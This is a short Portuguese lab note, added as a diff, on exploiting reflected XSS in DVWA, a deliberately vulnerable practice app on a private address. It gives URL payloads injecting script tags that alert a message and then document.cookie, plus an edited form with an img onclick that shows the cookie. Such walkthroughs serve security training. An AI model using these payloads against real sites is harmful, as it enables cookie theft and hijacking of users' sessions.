@@ -1,0 +1,23 @@
+XSS Reflected DOM DVWA
+
+LOW
+
+1 = Primeiro vamos explorar diretamente no URL:
+
+http://10.60.4.63/DVWA/vulnerabilities/xss_r/?name=<script>alert('Hello Brandon XSS')</script>
+
+2 = Agora vamos trocar para conseguir o cookie.
+
+http://10.60.4.63/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
+
+======================================================================
+
+MEDIUM & HARD
+
+1 = Vamos com botão direito em cima What's your name e vá em forms e edite
+coloque no fim o seguinte link
+
+<form>
+
+<img src="http://icons.iconseeker.com/png/fullsize/black-glossy/downloads-42.png" onclick="alert(document.cookie)">
+</form>
